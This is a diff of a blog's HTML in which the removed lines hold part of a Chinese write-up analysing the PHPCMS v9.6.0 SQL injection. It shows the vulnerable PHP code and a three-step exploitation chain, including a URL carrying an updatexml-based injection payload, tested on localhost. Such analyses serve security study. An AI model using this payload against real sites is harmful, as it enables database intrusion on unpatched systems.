-    $this-&gt;upload_path = pc_base::load_config(&apos;system&apos;,&apos;upload_path&apos;);      
-    $this-&gt;imgext = array(&apos;jpg&apos;,&apos;gif&apos;,&apos;png&apos;,&apos;bmp&apos;,&apos;jpeg&apos;);
-    $this-&gt;userid = $_SESSION[&apos;userid&apos;] ? $_SESSION[&apos;userid&apos;] : (param::get_cookie(&apos;_userid&apos;) ? param::get_cookie(&apos;_userid&apos;) : sys_auth($_POST[&apos;userid_flash&apos;],&apos;DECODE&apos;));
-    $this-&gt;isadmin = $this-&gt;admin_username = $_SESSION[&apos;roleid&apos;] ? 1 : 0;
-    $this-&gt;groupid = param::get_cookie(&apos;_groupid&apos;) ? param::get_cookie(&apos;_groupid&apos;) : 8;
-    //判断是否登录
-    if(empty($this-&gt;userid)){
-        showmessage(L(&apos;please_login&apos;,&apos;&apos;,&apos;member&apos;));
-    }
-}
-</code></pre><p>这里通过判断$this-&gt;userid来测试用户是否登录,可以发现userid除了可以来自于cookie外还可以来自于$_POST[‘userid_flash’]中. 这里师傅们使用的生成这个加密后的$_POST[‘userid_flash’]的点在<code>/phpcms/modules/wap/index.php</code>文件中:</p>
-<pre><code>function __construct() {        
-    $this-&gt;db = pc_base::load_model(&apos;content_model&apos;);
-    $this-&gt;siteid = isset($_GET[&apos;siteid&apos;]) &amp;&amp; (intval($_GET[&apos;siteid&apos;]) &gt; 0) ? intval(trim($_GET[&apos;siteid&apos;])) : (param::get_cookie(&apos;siteid&apos;) ? param::get_cookie(&apos;siteid&apos;) : 1);
-    param::set_cookie(&apos;siteid&apos;,$this-&gt;siteid);  
-    $this-&gt;wap_site = getcache(&apos;wap_site&apos;,&apos;wap&apos;);
-    $this-&gt;types = getcache(&apos;wap_type&apos;,&apos;wap&apos;);
-    $this-&gt;wap = $this-&gt;wap_site[$this-&gt;siteid];
-    define(&apos;WAP_SITEURL&apos;, $this-&gt;wap[&apos;domain&apos;] ? $this-&gt;wap[&apos;domain&apos;].&apos;index.php?&apos; : APP_PATH.&apos;index.php?m=wap&amp;siteid=&apos;.$this-&gt;siteid);
-    if($this-&gt;wap[&apos;status&apos;]!=1) exit(L(&apos;wap_close_status&apos;));
-}
-
-//展示首页
-public function init() {
-    $WAP = $this-&gt;wap;
-    $TYPE = $this-&gt;types;
-    $WAP_SETTING = string2array($WAP[&apos;setting&apos;]);
-    $GLOBALS[&apos;siteid&apos;] = $siteid = max($this-&gt;siteid,1);
-    $template = $WAP_SETTING[&apos;index_template&apos;] ? $WAP_SETTING[&apos;index_template&apos;] : &apos;index&apos;;
-    include template(&apos;wap&apos;, $template);
-}
-</code></pre><p>设置了一个siteid的cookie,可以利用这个cookie的值传入到之前的那个$_POST[‘userid_flash’]中.</p>
-<h2 id="0x03-注入验证"><a href="#0x03-注入验证" class="headerlink" title="0x03 注入验证"></a>0x03 注入验证</h2><h3 id="Step1-获取之前的userid"><a href="#Step1-获取之前的userid" class="headerlink" title="Step1 获取之前的userid"></a>Step1 获取之前的userid</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1</code>,获取cookie中的siteid值. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/1.png" alt="图片1"></p>
-<h3 id="Step2-获取加密后的sql语句"><a href="#Step2-获取加密后的sql语句" class="headerlink" title="Step2 获取加密后的sql语句"></a>Step2 获取加密后的sql语句</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id%3d%25*27+and+updatexml(1,concat(0x7e,database()),0x7e)%23%26m%3d1%26f%3dhaha%26modelid%3d2%26catid%3d7%26&amp;</code>,获取cookie中att_json值. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/2.png" alt="图片2"></p>
-<h3 id="Step3-执行注入"><a href="#Step3-执行注入" class="headerlink" title="Step3 执行注入"></a>Step3 执行注入</h3><p>访问<code>http://127.0.0.1/phpcms2/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=加密后的字符串</code>,即可验证. <img src="http://blog.imagemlt.xyz/wp-content/uploads/2017/12/3.png" alt="图片3"></p>
-<h2 id="0x04-参考文件"><a href="#0x04-参考文件" class="headerlink" title="0x04 参考文件"></a>0x04 参考文件</h2><ul>
-<li><a href="https://www.bertramc.cn/2017/06/16/34.html">【挖坟】PHPCMS v9.6.0 SQL注入</a></li>
-<li><a href="http://www.venenof.com/index.php/archives/347/">PHPCMS V9.6.0注入分析</a></li>
-</ul>
-<h2 id="0x05-题外话"><a href="#0x05-题外话" class="headerlink" title="0x05 题外话"></a>0x05 题外话</h2><p>比赛求各位大佬们轻虐!</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -3388,7 +2881,7 @@ public function init() {
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">55</span>
+                    <span class="site-state-item-count">57</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
